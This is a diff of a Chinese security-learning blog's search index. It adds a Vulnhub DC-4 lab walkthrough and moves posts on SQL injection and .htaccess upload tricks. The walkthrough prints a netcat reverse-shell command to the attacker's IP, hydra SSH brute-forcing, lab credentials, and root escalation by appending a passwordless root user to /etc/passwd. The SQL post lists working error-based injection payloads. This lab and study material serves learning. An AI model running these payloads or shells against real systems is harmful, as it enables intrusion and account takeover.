@@ -328,6 +328,139 @@
       </tags>
   </entry>
   <entry>
+    <title>Vulnhub-DC-4渗透学习</title>
+    <url>/2022/07/04/Vulnhub-DC-4/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC-4：192.168.8.168</p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/1.png" alt></p>
+<p>扫描靶机ip</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.168</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/2.png" alt></p>
+<p>发现开放了22和80端口，把信息都记录起来</p>
+<p>继续收集信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.168:80</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/3.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.168</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/4.png" alt></p>
+<p>nikto是kali自带的工具，用于扫描网站后台文件</p>
+<p>扫描完后发现并没有什么有用的信息了，也没有发现网站的框架、CMS等有用的信息</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>先尝试访问IP的80端口</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/5.png" alt></p>
+<p>发现是个登录入口，查看源代码，感觉就只是一个简单的登录窗口</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/6.png" alt></p>
+<p>既然是一个登录页面，尝试一下弱口令爆破吧，单独对密码进行爆破，字典使用Burp自带的</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/7.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/8.png" alt></p>
+<p>爆破完之后发现密码为：happy</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>得到的账号密码</p>
+<blockquote>
+<p>admin</p>
+<p>happy</p>
+</blockquote>
+<p>回到登录页面进行登录，第一次登录后页面并没有改变，再次登录后才能登录成功</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/9.png" alt></p>
+<p>随便试试，发现里面可以执行命令，怀疑有命令执行的漏洞</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/10.png" alt></p>
+<p>把数据包拦截可以看到确实有命令执行</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/11.png" alt></p>
+<p>既然是命令执行，为了方便我们的操作，反弹一下shell吧</p>
+<p>kali开启监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/12.png" alt></p>
+<p>然后在目标上执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.8.105 2222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/13.png" alt></p>
+<p>成功拿到shell</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/14.png" alt></p>
+<p>再利用python得到交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/15.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们都知道，flag大概率在root中，但很明显我们的权限不够，需要提权</p>
+<ol>
+<li><p>SUID提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/16.png" alt></p>
+<p>但是并没有常见的可提权的文件，比如：</p>
+<blockquote>
+<p>nmap、vim、find、bash、more、less、nano、cp</p>
+</blockquote>
+</li>
+<li><p>免密使用的root级别命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/17.png" alt></p>
+<p>但是发现需要密码，而我们没有密码，也行不通</p>
+</li>
+</ol>
+<p>好像走到尽头了，但别忘了我们扫到它的ssh端口是开放的，因此去寻找一下存在的ssh用户</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/18.png" alt></p>
+<p>发现存在三个用户</p>
+<p>分别进去查看一下有什么文件，发现里面只有jim用户里存有文件，然后就是不断的寻找有用的文件了，最终发现了一个存有密码的文件</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/19.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/20.png" alt></p>
+<p>那接下来思路就很明确了，爆破这个用户就行了</p>
+<p>首先将密码保存到本机的passwd.txt中，用户名就jim一个就行</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/21.png" alt></p>
+<p>然后利用hydra进行爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.168 -L user.txt -P passwd.txt ssh</span><br></pre></td></tr></table></figure>
+<p>成功获得jim的密码</p>
+<blockquote>
+<p>jibril04</p>
+</blockquote>
+<p><img src="/2022/07/04/Vulnhub-DC-4/22.png" alt></p>
+<p>接着利用刚刚的账号密码连接ssh进行登录</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/23.png" alt></p>
+<p>成功登录，而且出现了一段文字，翻译一下</p>
+<blockquote>
+<p>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p>Debian GNU/Linux 系统中包含的程序是免费软件；<br>每个程序的确切分配条款在<br>/usr/share/doc/*/copyright 中的单个文件。</p>
+<p>Debian GNU/Linux 绝对没有担保，在某种程度上<br>适用法律允许。<br>你有新邮件。</p>
+</blockquote>
+<p>似乎是这个系统在每个用户登录的时候发给他的通知，在最下面可以看到说jim收到了一封新邮件，那我们就去寻找一下这封邮件看看，在var目录下发现了mail</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/24.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/25.png" alt></p>
+<p>翻译看看就能发现里面有另一个用户charles的密码</p>
+<blockquote>
+<p>^xHhA&amp;hvim0y</p>
+</blockquote>
+<p>现在我们可以切换目录了，但是先测试一下jim用户能不能利用SUID提权和免密使用root命令</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/26.png" alt></p>
+<p>但是都没有成功，那就切换到charles用户试试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure>
+<p>成功切换用户，然后继续尝试上面两种提权方式</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/27.png" alt></p>
+<p>发现了一个可以免密使用的root命令：teehee</p>
+<p>百度一下就知道这是一个编辑器，可以用来提权</p>
+<p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee 提权 - 隐念笎 - 博客园</a></p>
+<p>提权思路就是利用teehee的root权限在passwd中写入一个免密的root权限用户</p>
+<p>使用echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;abab::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/28.png" alt></p>
+<blockquote>
+<p>passwd文件解读：（简单理解这个即可）<br><code>root:x:0:0::/home/admin:/bin/bash</code><br>[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]<br>“-a” 选项的作用等同于 “&gt;&gt;” 命令<br>【额外补充：没有给新用户创建密码是因为你创建了也没有用，因为第2个位置是密码占位符，是占位符！！】</p>
+</blockquote>
+<p>然后切换到我们新添加的用户名</p>
+<p>成功拿到root权限，后面就进入root目录，就能成功得到flag</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/29.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/30.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/m0_62094846/article/details/125535798">DC4-靶机</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123594413?spm=1001.2014.3001.5502">dc-4 靶机渗透学习</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
+<p><a href="https://www.cnblogs.com/backlion/p/10503978.html">编辑/etc/passwd文件进行权限升级的技巧</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>靶机</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XXE</title>
     <url>/2022/06/02/XXE/</url>
     <content><![CDATA[<h1 id="一、XML与XXE"><a href="#一、XML与XXE" class="headerlink" title="一、XML与XXE"></a>一、XML与XXE</h1><blockquote>
@@ -947,6 +1080,55 @@
       </tags>
   </entry>
   <entry>
+    <title>sql注入</title>
+    <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
+    <content><![CDATA[<h2 id="一、报错盲注"><a href="#一、报错盲注" class="headerlink" title="一、报错盲注"></a>一、报错盲注</h2><h3 id="1、通过updatexml报错"><a href="#1、通过updatexml报错" class="headerlink" title="1、通过updatexml报错"></a>1、通过updatexml报错</h3><p>爆数据库名：<code>&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
+<p>爆表名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))--+</code></p>
+<p>爆列名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=TABLE_NAME)),0x7e))--+</code></p>
+<p>爆字段数据：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))--+</code></p>
+<h3 id="2、通过floor报错"><a href="#2、通过floor报错" class="headerlink" title="2、通过floor报错"></a>2、通过floor报错</h3><p><code>&#39;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<h3 id="3、通过extractvalue报错"><a href="#3、通过extractvalue报错" class="headerlink" title="3、通过extractvalue报错"></a>3、通过extractvalue报错</h3><p>爆数据库名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select database()))))--+</code></p>
+<p>爆表名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</code></p>
+<p>爆列名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=TABLE_NAME))))--+</code></p>
+<p>爆字段数据：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))--+</code></p>
+<h2 id="二、布尔盲注"><a href="#二、布尔盲注" class="headerlink" title="二、布尔盲注"></a>二、布尔盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						#判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^guet[a-z]&#x27;					#匹配guet及guet...等</span><br><span class="line">left(database(),b)					#从左侧截取database名的前b位</span><br><span class="line">length(database())=8					#判断数据库database()名的长度</span><br><span class="line">substr(a,b,c)						#从位置b开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)						#从位置b开始，截取字符串a的c位</span><br><span class="line">ascii()							#返回字符ascii码值</span><br></pre></td></tr></table></figure>
+<p><strong>注入流程</strong>：</p>
+<ul>
+<li>数据库长度</li>
+<li>数据库表的ascii</li>
+<li>数据库中表的个数</li>
+<li>数据库中其中一个表名的长度</li>
+<li>数据库中其中一个表名的ascii</li>
+<li>列名的数量</li>
+<li>列名的长度</li>
+<li>列名的ascii</li>
+<li>字段的数量</li>
+<li>字段内容的长度</li>
+<li>字段内容对应的ascii</li>
+</ul>
+<h2 id="三、延时盲注"><a href="#三、延时盲注" class="headerlink" title="三、延时盲注"></a>三、延时盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,A,B)					#如果condition为true，返回A；反之返回B</span><br><span class="line">sleep()							#sql语句延时执行</span><br><span class="line">ascii(x)=97						#判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
+<h2 id="四、加解密注入"><a href="#四、加解密注入" class="headerlink" title="四、加解密注入"></a>四、加解密注入</h2><p>很多情况下，网站管理员经常会对传进的参数进行一个加密的操作，加密有可能是自己写，也有可能是base64、md5等等常见的加密</p>
+<p>这种情况下，我们传注入语句的时候就要传对应的加密的内容</p>
+<h2 id="五、二次注入"><a href="#五、二次注入" class="headerlink" title="五、二次注入"></a>五、二次注入</h2><ol>
+<li><p>插入恶意数据</p>
+<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p>
+</li>
+<li><p>引用恶意数据</p>
+<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
+</li>
+</ol>
+<h2 id="六、DNS注入"><a href="#六、DNS注入" class="headerlink" title="六、DNS注入"></a>六、DNS注入</h2><p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
+<p>适合的网站：<a href="http://ceye.io">http://ceye.io</a></p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MySQL简单手工注入</title>
     <url>/2022/01/08/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>题目是墨者里的一道入门题</p>
@@ -990,55 +1172,6 @@
 <p>最后的结果是：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</strong></p>
 <p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
 <p>将密码用md5解密，登录成功后即可获得key</p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入</title>
-    <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
-    <content><![CDATA[<h2 id="一、报错盲注"><a href="#一、报错盲注" class="headerlink" title="一、报错盲注"></a>一、报错盲注</h2><h3 id="1、通过updatexml报错"><a href="#1、通过updatexml报错" class="headerlink" title="1、通过updatexml报错"></a>1、通过updatexml报错</h3><p>爆数据库名：<code>&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
-<p>爆表名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))--+</code></p>
-<p>爆列名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=TABLE_NAME)),0x7e))--+</code></p>
-<p>爆字段数据：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))--+</code></p>
-<h3 id="2、通过floor报错"><a href="#2、通过floor报错" class="headerlink" title="2、通过floor报错"></a>2、通过floor报错</h3><p><code>&#39;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
-<h3 id="3、通过extractvalue报错"><a href="#3、通过extractvalue报错" class="headerlink" title="3、通过extractvalue报错"></a>3、通过extractvalue报错</h3><p>爆数据库名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select database()))))--+</code></p>
-<p>爆表名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</code></p>
-<p>爆列名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=TABLE_NAME))))--+</code></p>
-<p>爆字段数据：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))--+</code></p>
-<h2 id="二、布尔盲注"><a href="#二、布尔盲注" class="headerlink" title="二、布尔盲注"></a>二、布尔盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						#判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^guet[a-z]&#x27;					#匹配guet及guet...等</span><br><span class="line">left(database(),b)					#从左侧截取database名的前b位</span><br><span class="line">length(database())=8					#判断数据库database()名的长度</span><br><span class="line">substr(a,b,c)						#从位置b开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)						#从位置b开始，截取字符串a的c位</span><br><span class="line">ascii()							#返回字符ascii码值</span><br></pre></td></tr></table></figure>
-<p><strong>注入流程</strong>：</p>
-<ul>
-<li>数据库长度</li>
-<li>数据库表的ascii</li>
-<li>数据库中表的个数</li>
-<li>数据库中其中一个表名的长度</li>
-<li>数据库中其中一个表名的ascii</li>
-<li>列名的数量</li>
-<li>列名的长度</li>
-<li>列名的ascii</li>
-<li>字段的数量</li>
-<li>字段内容的长度</li>
-<li>字段内容对应的ascii</li>
-</ul>
-<h2 id="三、延时盲注"><a href="#三、延时盲注" class="headerlink" title="三、延时盲注"></a>三、延时盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,A,B)					#如果condition为true，返回A；反之返回B</span><br><span class="line">sleep()							#sql语句延时执行</span><br><span class="line">ascii(x)=97						#判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
-<h2 id="四、加解密注入"><a href="#四、加解密注入" class="headerlink" title="四、加解密注入"></a>四、加解密注入</h2><p>很多情况下，网站管理员经常会对传进的参数进行一个加密的操作，加密有可能是自己写，也有可能是base64、md5等等常见的加密</p>
-<p>这种情况下，我们传注入语句的时候就要传对应的加密的内容</p>
-<h2 id="五、二次注入"><a href="#五、二次注入" class="headerlink" title="五、二次注入"></a>五、二次注入</h2><ol>
-<li><p>插入恶意数据</p>
-<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p>
-</li>
-<li><p>引用恶意数据</p>
-<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
-</li>
-</ol>
-<h2 id="六、DNS注入"><a href="#六、DNS注入" class="headerlink" title="六、DNS注入"></a>六、DNS注入</h2><p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
-<p>适合的网站：<a href="http://ceye.io">http://ceye.io</a></p>
 ]]></content>
       <categories>
         <category>搞渗透</category>
@@ -1187,50 +1320,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Failed to load resource</title>
-    <url>/2022/01/10/study-3/</url>
-    <content><![CDATA[<p>最近搭博客想弄一个live2d的人物出来玩，于是去网上尝试了各种办法，眼看着就要成功</p>
-<p>但是 你知道的，<del>没有bug的程序不是一个好程序</del>，不会修bug的程序员不是一个好程序员</p>
-<p>bug们想尽各种办法出现，只为了锻炼我们的能力</p>
-<p><img src="/2022/01/10/study-3/3.jpg" alt></p>
-<p>比如：</p>
-<p><img src="/2022/01/10/study-3/1.png" alt></p>
-<p><img src="/2022/01/10/study-3/2.png" alt></p>
-<p>在我这里他们是同一种错误，只是不同的浏览器而已</p>
-<span id="more"></span>
-<hr>
-<p>我在网上看了无数的文章，参考了无数的方法，都不太行，只能说不是我报错的类型</p>
-<p>看着这些404 not found 我觉得很大可能是路径问题</p>
-<p>加上很多文章也说路径问题</p>
-<p>于是进行了修改：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>更改后：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>有点作用，’ ./ ‘ 表示当前目录，它找得到这个css文件了，但是其他网页怎么办，难不成每个网页都配一个这个文件夹？</p>
-<p>于是我改成绝对路径：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;D:/Blog/themes/next/source/live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>但结果并不良好，还是出现了 Failed to load resource 的报错，于是我找到这个文件发现：</p>
-<p>请求网址变成了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4000/D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
-<p>你说这是什么道理（无奈）</p>
-<hr>
-<p>于是我真的给每一个网页配一份文件，搞了两天，实在没招了</p>
-<p>所以报出这两种错很大可能是路径有错，毕竟亲身经历过</p>
-<hr>
-<p>参考：</p>
-<p><a href="https://ask.csdn.net/questions/755371">https://ask.csdn.net/questions/755371</a></p>
-<p><a href="https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff">https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff</a></p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>IP地址详解</title>
     <url>/2022/01/09/study/</url>
     <content><![CDATA[<h1 id="0x01-IP（IPv4）"><a href="#0x01-IP（IPv4）" class="headerlink" title="0x01 IP（IPv4）"></a>0x01 IP（IPv4）</h1><p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
@@ -1298,24 +1387,47 @@
       </tags>
   </entry>
   <entry>
-    <title>.htaccess文件上传漏洞</title>
-    <url>/2022/01/09/upload-1/</url>
-    <content><![CDATA[<p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404页面、改文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<p>需要用到的代码如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php .png .jpg</span><br></pre></td></tr></table></figure>
-<p>通过<code>.htaccess</code>文件，调用<code>php</code>的解析器解析一个文件名只要是<code>.png</code> <code>.jpg</code>格式的文件，可以自己视实际情况添加。这个文件的内容如果是一句话木马，即可利用中国菜刀进行连接。</p>
-<h3 id="实战意义："><a href="#实战意义：" class="headerlink" title="实战意义："></a>实战意义：</h3><ol>
-<li>如果存在可以上传<code>.htaccess</code>文件，就可以直接利用规则解析</li>
-<li>如果存在修改<code>.htaccess</code>文件权限，修改解析规则</li>
-</ol>
-<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><code>.htaccess</code>文件不能起名字，他就是<code>.htaccess</code>文件，如果你将他改为<code>4.htaccess</code>或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>
+    <title>Failed to load resource</title>
+    <url>/2022/01/10/study-3/</url>
+    <content><![CDATA[<p>最近搭博客想弄一个live2d的人物出来玩，于是去网上尝试了各种办法，眼看着就要成功</p>
+<p>但是 你知道的，<del>没有bug的程序不是一个好程序</del>，不会修bug的程序员不是一个好程序员</p>
+<p>bug们想尽各种办法出现，只为了锻炼我们的能力</p>
+<p><img src="/2022/01/10/study-3/3.jpg" alt></p>
+<p>比如：</p>
+<p><img src="/2022/01/10/study-3/1.png" alt></p>
+<p><img src="/2022/01/10/study-3/2.png" alt></p>
+<p>在我这里他们是同一种错误，只是不同的浏览器而已</p>
+<span id="more"></span>
+<hr>
+<p>我在网上看了无数的文章，参考了无数的方法，都不太行，只能说不是我报错的类型</p>
+<p>看着这些404 not found 我觉得很大可能是路径问题</p>
+<p>加上很多文章也说路径问题</p>
+<p>于是进行了修改：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>更改后：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有点作用，’ ./ ‘ 表示当前目录，它找得到这个css文件了，但是其他网页怎么办，难不成每个网页都配一个这个文件夹？</p>
+<p>于是我改成绝对路径：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;D:/Blog/themes/next/source/live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但结果并不良好，还是出现了 Failed to load resource 的报错，于是我找到这个文件发现：</p>
+<p>请求网址变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4000/D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
+<p>你说这是什么道理（无奈）</p>
+<hr>
+<p>于是我真的给每一个网页配一份文件，搞了两天，实在没招了</p>
+<p>所以报出这两种错很大可能是路径有错，毕竟亲身经历过</p>
+<hr>
+<p>参考：</p>
+<p><a href="https://ask.csdn.net/questions/755371">https://ask.csdn.net/questions/755371</a></p>
+<p><a href="https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff">https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff</a></p>
 ]]></content>
       <categories>
-        <category>搞渗透</category>
+        <category>基础知识和笔记</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>文件上传</tag>
+        <tag>learn</tag>
       </tags>
   </entry>
   <entry>
@@ -1389,6 +1501,27 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>.htaccess文件上传漏洞</title>
+    <url>/2022/01/09/upload-1/</url>
+    <content><![CDATA[<p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404页面、改文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p>需要用到的代码如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php .png .jpg</span><br></pre></td></tr></table></figure>
+<p>通过<code>.htaccess</code>文件，调用<code>php</code>的解析器解析一个文件名只要是<code>.png</code> <code>.jpg</code>格式的文件，可以自己视实际情况添加。这个文件的内容如果是一句话木马，即可利用中国菜刀进行连接。</p>
+<h3 id="实战意义："><a href="#实战意义：" class="headerlink" title="实战意义："></a>实战意义：</h3><ol>
+<li>如果存在可以上传<code>.htaccess</code>文件，就可以直接利用规则解析</li>
+<li>如果存在修改<code>.htaccess</code>文件权限，修改解析规则</li>
+</ol>
+<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><code>.htaccess</code>文件不能起名字，他就是<code>.htaccess</code>文件，如果你将他改为<code>4.htaccess</code>或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -1713,139 +1846,6 @@
       <tags>
         <tag>web</tag>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
